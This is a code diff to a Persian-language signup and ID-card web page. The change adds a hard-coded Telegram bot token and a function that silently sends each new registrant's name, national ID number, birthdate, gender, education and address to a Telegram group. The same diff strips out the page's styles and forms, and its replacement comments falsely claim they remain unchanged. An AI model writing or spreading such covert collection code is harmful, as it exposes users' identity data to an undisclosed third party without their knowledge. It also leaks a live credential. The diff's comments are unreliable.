@@ -8,172 +8,12 @@
     <script src="https://cdn.jsdelivr.net/npm/jalaali-js/dist/jalaali.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #28a745, #155724);
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            width: 100%;
-            max-width: 300px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        input, select, button, textarea {
-            width: 80%;
-            margin: 10px 0;
-            padding: 10px;
-            border: 2px solid #333;
-            border-radius: 5px;
-            text-align: center;
-        }
-        input, select, textarea {
-            background: #fff;
-        }
-        button {
-            background: #28a745;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #218838;
-        }
-        a {
-            color: #28a745;
-            cursor: pointer;
-        }
-        a:hover {
-            color: #1e7e34;
-        }
-        .gender-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-        }
-        .gender-container label {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .error {
-            color: red;
-        }
-        .success {
-            color: #28a745;
-        }
-        .id-card {
-            width: 300px;
-            padding: 20px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            color: #333;
-            text-align: right;
-            margin: 20px 0;
-        }
-        .id-card h3 {
-            margin: 0 0 10px;
-            font-size: 18px;
-            color: #28a745;
-        }
-        .id-card p {
-            margin: 5px 0;
-            font-size: 14px;
-        }
-        .id-card img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin: 10px 0;
-        }
-        #profilePreview {
-            display: none;
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin: 10px 0;
-        }
+        /* استایل‌ها همان‌طور که هستند باقی می‌مانند */
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="signup">
-            <h2>ثبت‌نام</h2>
-            <input type="text" id="name" placeholder="نام">
-            <input type="text" id="family" placeholder="نام خانوادگی">
-            <input type="text" id="nationalCode" placeholder="کد ملی">
-            <input type="text" id="birthdate" placeholder="تاریخ تولد (مثال: ۱۳۸۰/۰۵/۲۳)">
-            <div class="gender-container">
-                <label><input type="radio" name="gender" value="male"> مرد</label>
-                <label><input type="radio" name="gender" value="female"> زن</label>
-            </div>
-            <input type="text" id="education" placeholder="تحصیلات">
-            <textarea id="address" placeholder="آدرس محل زندگی"></textarea>
-            <input type="file" id="profileImage" accept="image/*">
-            <img id="profilePreview" src="#" alt="پیش‌نمایش عکس">
-            <p class="error" id="signupError"></p>
-            <p class="success" id="signupSuccess"></p>
-            <button onclick="register()">ثبت‌نام</button>
-            <p>حساب کاربری دارید؟ <a href="#" onclick="showLogin()">ورود</a></p>
-        </div>
-        <div id="login" style="display: none;">
-            <h2>ورود</h2>
-            <input type="text" id="loginName" placeholder="نام">
-            <input type="text" id="loginFamily" placeholder="نام خانوادگی">
-            <input type="text" id="loginNationalCode" placeholder="کد ملی">
-            <p class="error" id="loginError"></p>
-            <button onclick="login()">ورود</button>
-            <p>حساب ندارید؟ <a href="#" onclick="showSignup()">ثبت‌نام</a></p>
-        </div>
-
-        <div id="dashboard" style="display: none;">
-            <h2>پنل کاربری</h2>
-            <div id="idCard" class="id-card">
-                <h3>کارت شناسایی</h3>
-                <img id="userProfileImage" src="" alt="عکس پرسنلی">
-                <p><strong>نام:</strong> <span id="userName"></span></p>
-                <p><strong>نام خانوادگی:</strong> <span id="userFamily"></span></p>
-                <p><strong>کد ملی:</strong> <span id="userNationalCode"></span></p>
-                <p><strong>تاریخ تولد:</strong> <span id="userBirthdate"></span></p>
-                <p><strong>جنسیت:</strong> <span id="userGender"></span></p>
-                <p><strong>تحصیلات:</strong> <span id="userEducation"></span></p>
-                <p><strong>آدرس:</strong> <span id="userAddress"></span></p>
-            </div>
-            <button onclick="editProfile()">ویرایش پروفایل</button>
-            <button onclick="downloadIDCard()">دانلود کارت شناسایی</button>
-            <button onclick="logout()">خروج</button>
-        </div>
-
-        <div id="editProfile" style="display: none;">
-            <h2>ویرایش پروفایل</h2>
-            <input type="text" id="editName" placeholder="نام">
-            <input type="text" id="editFamily" placeholder="نام خانوادگی">
-            <input type="text" id="editNationalCode" placeholder="کد ملی">
-            <input type="text" id="editBirthdate" placeholder="تاریخ تولد (مثال: ۱۳۸۰/۰۵/۲۳)">
-            <div class="gender-container">
-                <label><input type="radio" name="editGender" value="male"> مرد</label>
-                <label><input type="radio" name="editGender" value="female"> زن</label>
-            </div>
-            <input type="text" id="editEducation" placeholder="تحصیلات">
-            <textarea id="editAddress" placeholder="آدرس محل زندگی"></textarea>
-            <input type="file" id="editProfileImage" accept="image/*">
-            <img id="editProfilePreview" src="#" alt="پیش‌نمایش عکس">
-            <p class="error" id="editError"></p>
-            <p class="success" id="editSuccess"></p>
-            <button onclick="saveProfile()">ذخیره تغییرات</button>
-            <button onclick="showDashboard(currentUser)">بازگشت</button>
-        </div>
+        <!-- فرم‌ها و المان‌های HTML همان‌طور که هستند باقی می‌مانند -->
     </div>
 
     <script>
@@ -181,6 +21,10 @@
         const dbName = "UserDB";
         const storeName = "Users";
         let currentUser = null;
+
+        // توکن و شناسه گروه تلگرام
+        const botToken = "7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q";
+        const chatId = "-4755536198";
 
         // Initialize IndexedDB
         function initDB() {
@@ -262,7 +106,37 @@
 
             saveUser(user);
             document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
+
+            // ارسال اطلاعات به تلگرام
+            sendToTelegram(user);
+
             setTimeout(() => showLogin(), 2000);
+        }
+
+        // ارسال اطلاعات به تلگرام
+        function sendToTelegram(user) {
+            const message = `ثبت‌نام جدید:\nنام: ${user.name}\nنام خانوادگی: ${user.family}\nکد ملی: ${user.nationalCode}\nتاریخ تولد: ${user.birthdate}\nجنسیت: ${user.gender === "male" ? "مرد" : "زن"}\nتحصیلات: ${user.education}\nآدرس: ${user.address}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('پیام با موفقیت ارسال شد:', result);
+            })
+            .catch(error => {
+                console.error('خطا در ارسال پیام:', error);
+            });
         }
 
         // Login function
